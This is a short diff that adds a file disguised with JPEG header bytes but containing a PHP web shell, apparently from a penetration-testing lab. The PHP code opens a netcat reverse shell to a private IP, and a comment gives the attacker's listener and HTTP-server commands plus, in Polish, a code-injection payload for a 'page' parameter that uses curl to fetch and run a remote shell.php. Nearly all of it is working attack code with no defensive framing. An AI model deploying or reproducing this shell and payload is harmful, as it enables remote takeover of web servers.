@@ -1,0 +1,12 @@
+ÿØÿàFFE0
+<?php
+    system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.249 443 >/tmp/f');
+?>
+
+/*
+sudo nc -nlvp 443  
+python3 -m http.server 80
+
+W przeglÄ…darce, pobieram i uruchamiam ten plik:
+index.php?page=schedule' and die(system("curl http://192.168.45.176:800/shell.php|php")) or '
+*/
